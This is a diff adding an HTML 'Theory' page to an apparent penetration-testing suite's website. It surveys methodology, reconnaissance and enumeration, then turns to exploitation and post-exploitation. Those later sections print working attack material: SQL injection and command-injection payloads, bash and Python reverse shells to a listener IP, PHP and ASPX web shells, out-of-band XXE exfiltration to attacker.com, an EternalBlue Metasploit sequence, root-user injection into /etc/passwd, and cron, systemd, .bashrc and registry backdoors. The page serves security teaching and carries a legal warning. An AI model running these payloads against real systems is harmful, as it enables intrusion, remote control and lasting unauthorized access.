@@ -1,0 +1,1848 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Theory - Penetration Testing Fundamentals</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/docs.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <nav class="navbar">
+            <div class="container">
+                <div class="nav-brand">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Penetration Test Suite</span>
+                </div>
+                <ul class="nav-menu">
+                    <li><a href="index.html">Home</a></li>
+                    <li><a href="index.html#features">Features</a></li>
+                    <li><a href="documentation.html">Docs</a></li>
+                    <li><a href="theory.html" class="active">Theory</a></li>
+                    <li><a href="https://github.com/samueldk12/penetration-test" target="_blank">
+                        <i class="fab fa-github"></i> GitHub
+                    </a></li>
+                </ul>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Theory Content -->
+    <div class="docs-container">
+        <aside class="docs-sidebar">
+            <nav class="docs-nav">
+                <h3>Theory</h3>
+                <ul>
+                    <li><a href="#introduction">Introduction</a></li>
+                    <li><a href="#methodology">Methodology</a></li>
+                    <li><a href="#reconnaissance">Reconnaissance</a></li>
+                    <li><a href="#enumeration">Enumeration</a></li>
+                    <li><a href="#vulnerability-analysis">Vulnerability Analysis</a></li>
+                    <li><a href="#exploitation">Exploitation</a></li>
+                    <li><a href="#post-exploitation">Post-Exploitation</a></li>
+                    <li><a href="#osint">OSINT</a></li>
+                    <li><a href="#web-security">Web Security</a></li>
+                    <li><a href="#network-security">Network Security</a></li>
+                    <li><a href="#reporting">Reporting</a></li>
+                    <li><a href="#legal-ethical">Legal & Ethical</a></li>
+                </ul>
+            </nav>
+        </aside>
+
+        <main class="docs-content">
+            <!-- Introduction -->
+            <section id="introduction" class="doc-section">
+                <h1><i class="fas fa-book-open"></i> Introduction to Penetration Testing</h1>
+
+                <p>
+                    Penetration testing, also known as "pentesting" or ethical hacking, is an authorized
+                    simulated cyberattack on a computer system, performed to evaluate the security of the system.
+                </p>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-bullseye"></i> What is Penetration Testing?</h3>
+                    <p>
+                        Penetration testing is the practice of testing a computer system, network, or web application
+                        to find security vulnerabilities that an attacker could exploit. The goal is to identify
+                        weaknesses before malicious actors do and provide recommendations for remediation.
+                    </p>
+                </div>
+
+                <h2>Types of Penetration Tests</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-box"></i> Black Box Testing</h3>
+                    <p>
+                        The tester has no prior knowledge of the system. This simulates an external attacker's
+                        perspective and tests the system as an outsider would.
+                    </p>
+                    <ul>
+                        <li>No credentials or internal information</li>
+                        <li>Most realistic external threat simulation</li>
+                        <li>Longer testing time required</li>
+                    </ul>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-box-open"></i> Gray Box Testing</h3>
+                    <p>
+                        The tester has partial knowledge of the system, such as login credentials or network
+                        diagrams. This simulates an insider threat or compromised account.
+                    </p>
+                    <ul>
+                        <li>Limited credentials and information</li>
+                        <li>Balances depth and breadth of testing</li>
+                        <li>Most common in practice</li>
+                    </ul>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-eye"></i> White Box Testing</h3>
+                    <p>
+                        The tester has complete knowledge of the system including source code, architecture,
+                        and credentials. This enables the most comprehensive security assessment.
+                    </p>
+                    <ul>
+                        <li>Full access to system information</li>
+                        <li>Can identify deeper vulnerabilities</li>
+                        <li>Most efficient use of testing time</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Methodology -->
+            <section id="methodology" class="doc-section">
+                <h1><i class="fas fa-tasks"></i> Penetration Testing Methodology</h1>
+
+                <p>
+                    A structured approach is essential for effective penetration testing. The most widely
+                    adopted methodologies include PTES, OWASP, and NIST guidelines.
+                </p>
+
+                <div class="methodology-steps">
+                    <div class="step">
+                        <h3>Planning & Reconnaissance</h3>
+                        <p>
+                            Define the scope and goals of a test, including the systems to be addressed and
+                            the testing methods to be used. Gather intelligence (OSINT) to better understand
+                            how a target works.
+                        </p>
+                        <ul>
+                            <li>Define scope and objectives</li>
+                            <li>Obtain necessary authorizations</li>
+                            <li>Gather passive information</li>
+                            <li>Identify target assets</li>
+                        </ul>
+                    </div>
+
+                    <div class="step">
+                        <h3>Scanning & Enumeration</h3>
+                        <p>
+                            Use technical tools to probe the target for vulnerabilities. This includes port
+                            scanning, network mapping, service enumeration, and application scanning.
+                        </p>
+                        <ul>
+                            <li>Port scanning (Nmap)</li>
+                            <li>Service version detection</li>
+                            <li>OS fingerprinting</li>
+                            <li>Web application scanning</li>
+                        </ul>
+                    </div>
+
+                    <div class="step">
+                        <h3>Vulnerability Analysis</h3>
+                        <p>
+                            Analyze the information gathered to identify potential vulnerabilities. This
+                            involves both automated scanning and manual analysis.
+                        </p>
+                        <ul>
+                            <li>Automated vulnerability scanning</li>
+                            <li>Manual code review</li>
+                            <li>Configuration analysis</li>
+                            <li>Vulnerability prioritization</li>
+                        </ul>
+                    </div>
+
+                    <div class="step">
+                        <h3>Exploitation</h3>
+                        <p>
+                            Attempt to exploit identified vulnerabilities to gain unauthorized access or
+                            demonstrate the potential impact of the vulnerability.
+                        </p>
+                        <ul>
+                            <li>Exploit development/selection</li>
+                            <li>Privilege escalation</li>
+                            <li>Lateral movement</li>
+                            <li>Maintain access</li>
+                        </ul>
+                    </div>
+
+                    <div class="step">
+                        <h3>Post-Exploitation</h3>
+                        <p>
+                            Determine the value of the compromised system and maintain access for further
+                            testing. Assess the impact and potential damage.
+                        </p>
+                        <ul>
+                            <li>Data exfiltration simulation</li>
+                            <li>Persistence mechanisms</li>
+                            <li>Privilege escalation</li>
+                            <li>Network pivoting</li>
+                        </ul>
+                    </div>
+
+                    <div class="step">
+                        <h3>Reporting</h3>
+                        <p>
+                            Document all findings, including vulnerabilities discovered, data accessed, and
+                            the amount of time the tester was able to remain in the system undetected.
+                        </p>
+                        <ul>
+                            <li>Executive summary</li>
+                            <li>Technical findings</li>
+                            <li>Risk assessment</li>
+                            <li>Remediation recommendations</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Reconnaissance -->
+            <section id="reconnaissance" class="doc-section">
+                <h1><i class="fas fa-binoculars"></i> Reconnaissance</h1>
+
+                <p>
+                    Reconnaissance is the process of gathering information about a target before launching
+                    an attack. It's divided into passive and active reconnaissance. This phase is crucial
+                    as it lays the foundation for the entire penetration test.
+                </p>
+
+                <h2>Passive Reconnaissance</h2>
+                <div class="concept-card">
+                    <p>
+                        Gathering information without directly interacting with the target system, minimizing
+                        the risk of detection. This is the safest form of reconnaissance.
+                    </p>
+                    <ul>
+                        <li><strong>WHOIS:</strong> Domain registration information, registrar details, nameservers</li>
+                        <li><strong>DNS Records:</strong> MX, TXT, A, AAAA, NS, SOA, CNAME records</li>
+                        <li><strong>Search Engines:</strong> Google dorking, Shodan, Censys, ZoomEye</li>
+                        <li><strong>Social Media:</strong> Employee information, technologies used, org structure</li>
+                        <li><strong>Job Postings:</strong> Technology stack clues, internal tools, security measures</li>
+                        <li><strong>Public Databases:</strong> Certificate transparency logs, breach databases</li>
+                        <li><strong>Archive Sites:</strong> Wayback Machine for historical data</li>
+                        <li><strong>Code Repositories:</strong> GitHub, GitLab for exposed credentials</li>
+                        <li><strong>Public Documents:</strong> PDFs, presentations with metadata</li>
+                        <li><strong>Financial Records:</strong> SEC filings, annual reports</li>
+                    </ul>
+                </div>
+
+                <h2>Active Reconnaissance</h2>
+                <div class="concept-card">
+                    <p>
+                        Directly interacting with the target system to gather information. More likely to
+                        be detected but yields more detailed and current information.
+                    </p>
+                    <ul>
+                        <li><strong>Port Scanning:</strong> Nmap for open ports and services</li>
+                        <li><strong>Service Enumeration:</strong> Banner grabbing, version detection</li>
+                        <li><strong>Network Mapping:</strong> Topology discovery, route tracing</li>
+                        <li><strong>Web Crawling:</strong> Directory enumeration, sitemap analysis</li>
+                        <li><strong>DNS Zone Transfers:</strong> Full DNS records (if misconfigured)</li>
+                        <li><strong>Email Verification:</strong> Testing email addresses for validity</li>
+                        <li><strong>Web Technology Detection:</strong> Framework identification, CMS detection</li>
+                        <li><strong>WAF Detection:</strong> Identifying web application firewalls</li>
+                    </ul>
+                </div>
+
+                <h2>Advanced Reconnaissance Techniques</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-search"></i> Google Dorking</h3>
+                    <p>Using advanced search operators to find sensitive information:</p>
+                    <div class="code-block">
+                        <pre><code># Find exposed files
+site:example.com filetype:pdf | filetype:doc | filetype:xls
+site:example.com inurl:admin | inurl:login | inurl:dashboard
+site:example.com ext:sql | ext:db | ext:log
+
+# Find sensitive information
+site:example.com intext:"password" | intext:"username"
+site:github.com "example.com" "api_key" | "secret_key"
+site:pastebin.com "example.com"
+
+# Find subdomains
+site:*.example.com
+
+# Find backup files
+site:example.com ext:bak | ext:old | ext:backup</code></pre>
+                    </div>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-network-wired"></i> Shodan & Censys</h3>
+                    <p>Internet-wide scanning engines for exposed services:</p>
+                    <div class="code-block">
+                        <pre><code># Shodan queries
+hostname:example.com
+org:"Company Name"
+ssl.cert.subject.CN:example.com
+http.title:"Admin Panel"
+
+# Find specific vulnerabilities
+product:"Apache" version:"2.4.49" # Vulnerable version
+
+# Find exposed databases
+product:"MongoDB" port:27017
+product:"Redis" port:6379</code></pre>
+                    </div>
+                </div>
+
+                <h2>Tools for Reconnaissance</h2>
+                <div class="code-block">
+                    <pre><code># Subdomain enumeration
+python3 penetration-test.py scan example.com --plugin subdominator
+
+# DNS brute force
+python3 penetration-test.py scan example.com --plugin dnsbruter
+dig example.com ANY
+fierce --domain example.com
+
+# Network scanning
+nmap -sV -sC -p- example.com
+nmap -sV -O -A example.com  # Aggressive scan with OS detection
+
+# Web crawling
+katana -u https://example.com -d 3 -jc
+python3 penetration-test.py scan example.com --plugin katana_crawler
+
+# Technology detection
+python3 penetration-test.py scan example.com --plugin whatweb
+wafw00f https://example.com
+
+# OSINT gathering
+python3 penetration-test.py osint example.com --deep
+theHarvester -d example.com -b all</code></pre>
+                </div>
+
+                <h2>Information to Collect</h2>
+                <table class="options-table">
+                    <tr>
+                        <th>Category</th>
+                        <th>Information</th>
+                        <th>Sources</th>
+                    </tr>
+                    <tr>
+                        <td><strong>Network</strong></td>
+                        <td>IP ranges, subdomains, open ports</td>
+                        <td>DNS, Shodan, port scans</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Organization</strong></td>
+                        <td>Structure, employees, locations</td>
+                        <td>LinkedIn, company website, social media</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Technology</strong></td>
+                        <td>Stack, versions, frameworks</td>
+                        <td>Job postings, Wappalyzer, banners</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Security</strong></td>
+                        <td>WAF, IDS/IPS, security measures</td>
+                        <td>Active probing, WAF detection</td>
+                    </tr>
+                    <tr>
+                        <td><strong>People</strong></td>
+                        <td>Email formats, key personnel</td>
+                        <td>Hunter.io, LinkedIn, OSINT</td>
+                    </tr>
+                </table>
+            </section>
+
+            <!-- Enumeration -->
+            <section id="enumeration" class="doc-section">
+                <h1><i class="fas fa-list"></i> Enumeration</h1>
+
+                <p>
+                    Enumeration is the process of extracting detailed information from target systems.
+                    It goes deeper than reconnaissance, actively probing systems to discover users,
+                    shares, services, and configuration details.
+                </p>
+
+                <h2>Network Enumeration</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-network-wired"></i> Port and Service Enumeration</h3>
+                    <p>Identifying open ports and the services running on them:</p>
+                    <div class="code-block">
+                        <pre><code># Full TCP port scan
+nmap -p- -T4 -sV -sC target.com
+
+# UDP scan (top ports)
+nmap -sU --top-ports 100 target.com
+
+# Service version detection
+nmap -sV --version-intensity 9 target.com
+
+# Aggressive scan with scripts
+nmap -A -T4 target.com
+
+# Specific port with NSE scripts
+nmap -p 445 --script smb-enum-* target.com</code></pre>
+                    </div>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-folder-open"></i> SMB/CIFS Enumeration</h3>
+                    <p>Windows file sharing enumeration:</p>
+                    <div class="code-block">
+                        <pre><code># Enumerate shares
+smbclient -L //target.com -N
+enum4linux -a target.com
+
+# List shares with credentials
+smbmap -H target.com -u username -p password
+
+# Mount and explore SMB share
+mount -t cifs //target.com/share /mnt/share
+
+# Enumerate users
+crackmapexec smb target.com -u '' -p '' --users
+rpcclient -U "" -N target.com
+> enumdomusers
+> queryuser 0x1f4</code></pre>
+                    </div>
+                </div>
+
+                <h2>Web Application Enumeration</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-sitemap"></i> Directory and File Discovery</h3>
+                    <p>Finding hidden directories and files:</p>
+                    <div class="code-block">
+                        <pre><code># Directory bruteforcing
+ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
+
+# Recursive enumeration
+python3 penetration-test.py scan target.com --plugin ffuf_fuzzer --recursive
+
+# Common files
+curl https://target.com/robots.txt
+curl https://target.com/sitemap.xml
+curl https://target.com/.git/config
+curl https://target.com/.env</code></pre>
+                    </div>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-code"></i> Web Technology Enumeration</h3>
+                    <div class="code-block">
+                        <pre><code># Technology detection
+python3 penetration-test.py scan target.com --plugin whatweb
+whatweb -a 3 https://target.com
+
+# Check headers
+curl -I https://target.com
+
+# Identify CMS
+# WordPress
+curl https://target.com/wp-admin
+wpscan --url https://target.com --enumerate p,t,u
+
+# Drupal
+curl https://target.com/CHANGELOG.txt
+
+# Check for WAF
+python3 penetration-test.py scan target.com --plugin wafw00f</code></pre>
+                    </div>
+                </div>
+
+                <h2>Database Enumeration</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-database"></i> SQL Database Enumeration</h3>
+                    <div class="code-block">
+                        <pre><code># MySQL enumeration (port 3306)
+nmap -p 3306 --script mysql-enum target.com
+mysql -h target.com -u root -p
+
+# PostgreSQL (port 5432)
+psql -h target.com -U postgres
+
+# MongoDB (port 27017)
+mongo target.com:27017
+show dbs
+
+# Redis (port 6379)
+redis-cli -h target.com
+INFO
+KEYS *</code></pre>
+                    </div>
+                </div>
+
+                <h2>Active Directory Enumeration</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-users-cog"></i> Domain Enumeration</h3>
+                    <div class="code-block">
+                        <pre><code># BloodHound collection
+bloodhound-python -u user@domain.com -p password -ns dc.domain.com -d domain.com -c all
+
+# PowerView (Windows)
+Get-NetDomain
+Get-NetUser
+Get-NetGroup
+Get-NetComputer
+
+# ldapsearch
+ldapsearch -x -h target.com -b "dc=domain,dc=com"
+
+# Enumerate users
+crackmapexec smb target.com -u user -p pass --users
+impacket-GetADUsers domain.com/user:pass</code></pre>
+                    </div>
+                </div>
+
+                <h2>Common Ports and Services</h2>
+                <table class="options-table">
+                    <tr>
+                        <th>Port</th>
+                        <th>Service</th>
+                        <th>Enumeration Tools</th>
+                    </tr>
+                    <tr>
+                        <td>21</td>
+                        <td>FTP</td>
+                        <td>ftp, nmap --script ftp-*</td>
+                    </tr>
+                    <tr>
+                        <td>22</td>
+                        <td>SSH</td>
+                        <td>ssh, ssh-audit</td>
+                    </tr>
+                    <tr>
+                        <td>23</td>
+                        <td>Telnet</td>
+                        <td>telnet, nmap --script telnet-*</td>
+                    </tr>
+                    <tr>
+                        <td>25</td>
+                        <td>SMTP</td>
+                        <td>smtp-user-enum, nmap --script smtp-*</td>
+                    </tr>
+                    <tr>
+                        <td>53</td>
+                        <td>DNS</td>
+                        <td>dig, dnsenum, fierce</td>
+                    </tr>
+                    <tr>
+                        <td>80/443</td>
+                        <td>HTTP/HTTPS</td>
+                        <td>nikto, gobuster, ffuf</td>
+                    </tr>
+                    <tr>
+                        <td>139/445</td>
+                        <td>SMB</td>
+                        <td>enum4linux, smbmap, crackmapexec</td>
+                    </tr>
+                    <tr>
+                        <td>3306</td>
+                        <td>MySQL</td>
+                        <td>mysql, nmap --script mysql-*</td>
+                    </tr>
+                    <tr>
+                        <td>3389</td>
+                        <td>RDP</td>
+                        <td>rdesktop, nmap --script rdp-*</td>
+                    </tr>
+                    <tr>
+                        <td>5432</td>
+                        <td>PostgreSQL</td>
+                        <td>psql, nmap --script pgsql-*</td>
+                    </tr>
+                </table>
+            </section>
+
+            <!-- Vulnerability Analysis -->
+            <section id="vulnerability-analysis" class="doc-section">
+                <h1><i class="fas fa-search-plus"></i> Vulnerability Analysis</h1>
+
+                <p>
+                    Vulnerability analysis involves identifying, quantifying, and prioritizing vulnerabilities
+                    in a system. This phase bridges reconnaissance and exploitation.
+                </p>
+
+                <h2>Common Vulnerability Types</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-database"></i> SQL Injection</h3>
+                    <p>
+                        Injecting malicious SQL code into application queries to manipulate or extract database
+                        information.
+                    </p>
+                    <div class="code-block">
+                        <pre><code># Example vulnerable query
+SELECT * FROM users WHERE username='$username' AND password='$password'
+
+# Injection payload
+username: admin' OR '1'='1' --
+password: anything</code></pre>
+                    </div>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-code"></i> Cross-Site Scripting (XSS)</h3>
+                    <p>
+                        Injecting malicious scripts into web pages viewed by other users. Three main types:
+                        Stored, Reflected, and DOM-based XSS.
+                    </p>
+                    <div class="code-block">
+                        <pre><code># Reflected XSS example
+https://vulnerable.com/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+# Detection with our tool
+python3 penetration-test.py scan example.com --plugin dalfox_xss
+python3 penetration-test.py scan example.com --plugin xss_detector</code></pre>
+                    </div>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-lock-open"></i> Broken Authentication</h3>
+                    <p>
+                        Flaws in authentication mechanisms that allow attackers to compromise passwords,
+                        keys, or session tokens.
+                    </p>
+                    <ul>
+                        <li>Weak password policies</li>
+                        <li>Session fixation</li>
+                        <li>Credential stuffing</li>
+                        <li>Broken password recovery</li>
+                    </ul>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-shield-virus"></i> Security Misconfiguration</h3>
+                    <p>
+                        Insecure default configurations, incomplete setups, open cloud storage, misconfigured
+                        HTTP headers, and verbose error messages.
+                    </p>
+                    <ul>
+                        <li>Default credentials</li>
+                        <li>Directory listing enabled</li>
+                        <li>Unnecessary features enabled</li>
+                        <li>Detailed error messages</li>
+                    </ul>
+                </div>
+
+                <h2>Vulnerability Scanning Tools</h2>
+                <div class="code-block">
+                    <pre><code># Nuclei - Template-based scanner
+python3 penetration-test.py scan example.com --plugin nuclei_scanner
+
+# Nikto - Web server scanner
+python3 penetration-test.py scan example.com --plugin nikto_scanner
+
+# Comprehensive scan
+python3 penetration-test.py scan example.com --all-plugins --complete</code></pre>
+                </div>
+
+                <h2>Vulnerability Severity Rating (CVSS)</h2>
+                <table class="options-table">
+                    <tr>
+                        <th>Severity</th>
+                        <th>CVSS Score</th>
+                        <th>Description</th>
+                    </tr>
+                    <tr>
+                        <td><strong style="color: #ff4444;">Critical</strong></td>
+                        <td>9.0 - 10.0</td>
+                        <td>Requires immediate action</td>
+                    </tr>
+                    <tr>
+                        <td><strong style="color: #ff8800;">High</strong></td>
+                        <td>7.0 - 8.9</td>
+                        <td>Should be fixed soon</td>
+                    </tr>
+                    <tr>
+                        <td><strong style="color: #ffaa00;">Medium</strong></td>
+                        <td>4.0 - 6.9</td>
+                        <td>Plan to fix in near future</td>
+                    </tr>
+                    <tr>
+                        <td><strong style="color: #00ff88;">Low</strong></td>
+                        <td>0.1 - 3.9</td>
+                        <td>Minimal risk</td>
+                    </tr>
+                </table>
+            </section>
+
+            <!-- Exploitation -->
+            <section id="exploitation" class="doc-section">
+                <h1><i class="fas fa-bomb"></i> Exploitation</h1>
+
+                <p>
+                    Exploitation is the phase where identified vulnerabilities are actively exploited to
+                    gain unauthorized access, escalate privileges, or demonstrate the impact of security flaws.
+                    This phase requires careful planning and execution to avoid system damage.
+                </p>
+
+                <div class="alert alert-danger">
+                    <strong>⚠️ WARNING:</strong> Only exploit vulnerabilities in authorized systems during
+                    legitimate penetration tests. Unauthorized exploitation is illegal and unethical.
+                </div>
+
+                <h2>Web Application Exploitation</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-code"></i> SQL Injection Exploitation</h3>
+                    <p>Exploiting SQL injection vulnerabilities to extract data:</p>
+                    <div class="code-block">
+                        <pre><code># Manual SQL injection
+# Boolean-based blind SQLi
+?id=1' AND 1=1-- -  # Returns true
+?id=1' AND 1=2-- -  # Returns false
+
+# Union-based SQLi
+?id=-1' UNION SELECT 1,2,3,4,5-- -
+?id=-1' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -
+?id=-1' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
+?id=-1' UNION SELECT NULL,username,password FROM users-- -
+
+# Time-based blind SQLi
+?id=1' AND IF(1=1,SLEEP(5),0)-- -
+
+# Automated with SQLMap
+sqlmap -u "http://target.com/page?id=1" --dbs
+sqlmap -u "http://target.com/page?id=1" -D database --tables
+sqlmap -u "http://target.com/page?id=1" -D database -T users --columns
+sqlmap -u "http://target.com/page?id=1" -D database -T users -C username,password --dump
+
+# Reading files
+sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"
+
+# Getting shell
+sqlmap -u "http://target.com/page?id=1" --os-shell</code></pre>
+                    </div>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-terminal"></i> Command Injection</h3>
+                    <p>Exploiting OS command injection vulnerabilities:</p>
+                    <div class="code-block">
+                        <pre><code># Basic command injection payloads
+; ls -la
+| whoami
+& id
+`cat /etc/passwd`
+$(cat /etc/passwd)
+
+# Blind command injection
+; sleep 10
+; ping -c 10 attacker.com
+
+# Reverse shell payloads
+; bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+# URL encoded
+%3B%20whoami
+%7C%20id</code></pre>
+                    </div>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-file-upload"></i> File Upload Exploitation</h3>
+                    <p>Exploiting insecure file upload to achieve RCE:</p>
+                    <div class="code-block">
+                        <pre><code># PHP web shell
+&lt;?php system($_GET['cmd']); ?&gt;
+
+# More advanced PHP shell
+&lt;?php
+if(isset($_REQUEST['cmd'])){
+    echo "&lt;pre&gt;";
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+    echo "&lt;/pre&gt;";
+    die;
+}
+?&gt;
+
+# Bypass filters
+- Change extension: .php5, .phtml, .php3
+- Double extension: shell.php.jpg
+- Null byte: shell.php%00.jpg
+- Content-Type manipulation
+- Magic bytes prepending: Add GIF89a to start of file
+
+# ASP/ASPX shell
+&lt;%@ Page Language="C#" %&gt;
+&lt;% System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]); %&gt;</code></pre>
+                    </div>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-exchange-alt"></i> XXE (XML External Entity)</h3>
+                    <div class="code-block">
+                        <pre><code># Basic XXE payload
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;root&gt;&lt;data&gt;&xxe;&lt;/data&gt;&lt;/root&gt;
+
+# Out-of-band XXE
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"&gt; %xxe;]&gt;
+&lt;root&gt;&lt;/root&gt;
+
+# evil.dtd
+&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &# exfil SYSTEM 'http://attacker.com/?x=%file;'&gt;"&gt;
+%eval;
+%exfil;</code></pre>
+                    </div>
+                </div>
+
+                <h2>Network Service Exploitation</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-shield-virus"></i> SMB Exploitation</h3>
+                    <div class="code-block">
+                        <pre><code># EternalBlue (MS17-010)
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS target.com
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST attacker_ip
+exploit
+
+# PSExec with credentials
+psexec.py domain/user:password@target.com
+
+# Pass-the-Hash
+pth-winexe -U domain/user%hash //target.com cmd.exe
+crackmapexec smb target.com -u user -H hash -x "whoami"</code></pre>
+                    </div>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-lock-open"></i> Privilege Escalation</h3>
+                    <p><strong>Linux Privilege Escalation:</strong></p>
+                    <div class="code-block">
+                        <pre><code># SUID binaries
+find / -perm -u=s -type f 2>/dev/null
+
+# Sudo misconfigurations
+sudo -l
+sudo vim -c ':!/bin/bash'
+sudo find /etc -exec /bin/bash \;
+
+# Kernel exploits
+uname -a
+searchsploit linux kernel 4.15
+
+# Writable /etc/passwd
+echo 'newuser:$(openssl passwd -1 password123):0:0:root:/root:/bin/bash' >> /etc/passwd
+
+# Cron jobs
+cat /etc/crontab
+ls -la /etc/cron.*</code></pre>
+                    </div>
+
+                    <p><strong>Windows Privilege Escalation:</strong></p>
+                    <div class="code-block">
+                        <pre><code># Check privileges
+whoami /priv
+
+# Unquoted service paths
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\"
+
+# Weak service permissions
+accesschk.exe /accepteula -uwcqv "user" *
+
+# AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+
+# Token impersonation (SeImpersonatePrivilege)
+PrintSpoofer.exe -i -c cmd
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t *</code></pre>
+                    </div>
+                </div>
+
+                <h2>Exploitation Frameworks</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-toolbox"></i> Metasploit Framework</h3>
+                    <div class="code-block">
+                        <pre><code># Start Metasploit
+msfconsole
+
+# Search for exploits
+search type:exploit platform:windows smb
+search cve:2021
+
+# Use an exploit
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS 192.168.1.100
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+exploit
+
+# Meterpreter commands
+getuid
+sysinfo
+hashdump
+screenshot
+shell</code></pre>
+                    </div>
+                </div>
+
+                <h2>Common Exploitation Techniques</h2>
+                <table class="options-table">
+                    <tr>
+                        <th>Technique</th>
+                        <th>Description</th>
+                        <th>Tools</th>
+                    </tr>
+                    <tr>
+                        <td><strong>Buffer Overflow</strong></td>
+                        <td>Overwriting memory to execute arbitrary code</td>
+                        <td>Immunity Debugger, GDB</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Code Injection</strong></td>
+                        <td>Injecting malicious code into processes</td>
+                        <td>Manual, custom scripts</td>
+                    </tr>
+                    <tr>
+                        <td><strong>DLL Hijacking</strong></td>
+                        <td>Replacing legitimate DLLs with malicious ones</td>
+                        <td>Process Monitor, custom DLLs</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Race Conditions</strong></td>
+                        <td>Exploiting timing vulnerabilities</td>
+                        <td>Custom scripts, threading</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Deserialization</strong></td>
+                        <td>Exploiting insecure deserialization</td>
+                        <td>ysoserial, custom payloads</td>
+                    </tr>
+                </table>
+            </section>
+
+            <!-- Post-Exploitation -->
+            <section id="post-exploitation" class="doc-section">
+                <h1><i class="fas fa-chess-knight"></i> Post-Exploitation</h1>
+
+                <p>
+                    Post-exploitation occurs after gaining initial access to a system. The goal is to
+                    maintain access, escalate privileges, move laterally, exfiltrate data, and assess
+                    the full impact of the compromise while avoiding detection.
+                </p>
+
+                <h2>Maintaining Access</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-door-open"></i> Persistence Mechanisms</h3>
+                    <p><strong>Linux Persistence:</strong></p>
+                    <div class="code-block">
+                        <pre><code># SSH keys
+mkdir -p ~/.ssh
+echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
+# Cron jobs
+(crontab -l; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'") | crontab -
+
+# Systemd service
+cat > /etc/systemd/system/backdoor.service <<EOF
+[Unit]
+Description=Backdoor Service
+[Service]
+ExecStart=/tmp/backdoor.sh
+Restart=always
+[Install]
+WantedBy=multi-user.target
+EOF
+systemctl enable backdoor.service
+
+# .bashrc/.bash_profile
+echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> ~/.bashrc</code></pre>
+                    </div>
+
+                    <p><strong>Windows Persistence:</strong></p>
+                    <div class="code-block">
+                        <pre><code># Registry Run keys
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f
+
+# Scheduled tasks
+schtasks /create /tn "Backdoor" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru System
+
+# Service creation
